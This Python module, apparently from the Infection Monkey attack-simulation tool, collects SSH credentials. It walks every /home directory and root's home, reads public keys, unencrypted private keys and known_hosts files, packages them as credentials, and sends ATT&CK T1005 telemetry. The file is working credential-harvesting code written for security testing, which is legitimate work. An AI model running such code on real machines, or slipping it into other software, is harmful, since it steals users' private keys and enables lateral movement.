import glob
import logging
import os
import pwd
from typing import Dict, Iterable

from common.utils.attack_utils import ScanStatus
from infection_monkey.credential_collectors import (
    Credentials,
    ICredentialCollector,
    SSHKeypair,
    Username,
)
from infection_monkey.telemetry.attack.t1005_telem import T1005Telem

logger = logging.getLogger(__name__)


class SSHCollector(ICredentialCollector):
    """
    SSH keys and known hosts collection module
    """

    default_dirs = ["/.ssh/", "/"]

    def collect_credentials(self) -> Credentials:
        logger.info("Started scanning for SSH credentials")
        home_dirs = SSHCollector._get_home_dirs()
        ssh_info = SSHCollector._get_ssh_files(home_dirs)
        logger.info("Scanned for SSH credentials")

        return SSHCollector._to_credentials(ssh_info)

    @staticmethod
    def _to_credentials(ssh_info: Iterable[Dict]) -> Credentials:
        credentials_obj = Credentials(identities=[], secrets=[])

        for info in ssh_info:
            credentials_obj.identities.append(Username(info["name"]))
            ssh_keypair = {}
            if "public_key" in info:
                ssh_keypair["public_key"] = info["public_key"]
            if "private_key" in info:
                ssh_keypair["private_key"] = info["private_key"]
            if "public_key" in info:
                ssh_keypair["known_hosts"] = info["known_hosts"]

            credentials_obj.secrets.append(SSHKeypair(ssh_keypair))

        return credentials_obj

    @staticmethod
    def _get_home_dirs() -> Iterable[Dict]:
        root_dir = SSHCollector._get_ssh_struct("root", "")
        home_dirs = [
            SSHCollector._get_ssh_struct(x.pw_name, x.pw_dir)
            for x in pwd.getpwall()
            if x.pw_dir.startswith("/home")
        ]
        home_dirs.append(root_dir)
        return home_dirs

    @staticmethod
    def _get_ssh_struct(name: str, home_dir: str) -> Dict:
        """
        Construct the SSH info. It consisted of: name, home_dir,
        public_key, private_key and known_hosts.

        public_key: contents of *.pub file (public key)
        private_key: contents of * file (private key)
        known_hosts: contents of known_hosts file(all the servers keys are good for,
        possibly hashed)

        :param name: username of user, for whom the keys belong
        :param home_dir: users home directory
        :return: SSH info struct
        """
        return {
            "name": name,
            "home_dir": home_dir,
            "public_key": None,
            "private_key": None,
            "known_hosts": None,
        }

    @staticmethod
    def _get_ssh_files(usr_info: Iterable[Dict]) -> Iterable[Dict]:
        for info in usr_info:
            path = info["home_dir"]
            for directory in SSHCollector.default_dirs:
                if os.path.isdir(path + directory):
                    try:
                        current_path = path + directory
                        # Searching for public key
                        if glob.glob(os.path.join(current_path, "*.pub")):
                            # Getting first file in current path with .pub extension(public key)
                            public = glob.glob(os.path.join(current_path, "*.pub"))[0]
                            logger.info("Found public key in %s" % public)
                            try:
                                with open(public) as f:
                                    info["public_key"] = f.read()
                                # By default private key has the same name as public,
                                # only without .pub
                                private = os.path.splitext(public)[0]
                                if os.path.exists(private):
                                    try:
                                        with open(private) as f:
                                            # no use from ssh key if it's encrypted
                                            private_key = f.read()
                                            if private_key.find("ENCRYPTED") == -1:
                                                info["private_key"] = private_key
                                                logger.info("Found private key in %s" % private)
                                                T1005Telem(
                                                    ScanStatus.USED, "SSH key", "Path: %s" % private
                                                ).send()
                                            else:
                                                continue
                                    except (IOError, OSError):
                                        pass
                                # By default, known hosts file is called 'known_hosts'
                                known_hosts = os.path.join(current_path, "known_hosts")
                                if os.path.exists(known_hosts):
                                    try:
                                        with open(known_hosts) as f:
                                            info["known_hosts"] = f.read()
                                            logger.info("Found known_hosts in %s" % known_hosts)
                                    except (IOError, OSError):
                                        pass
                                # If private key found don't search more
                                if info["private_key"]:
                                    break
                            except (IOError, OSError):
                                pass
                    except OSError:
                        pass
        usr_info = [
            info
            for info in usr_info
            if info["private_key"] or info["known_hosts"] or info["public_key"]
        ]
        return usr_info
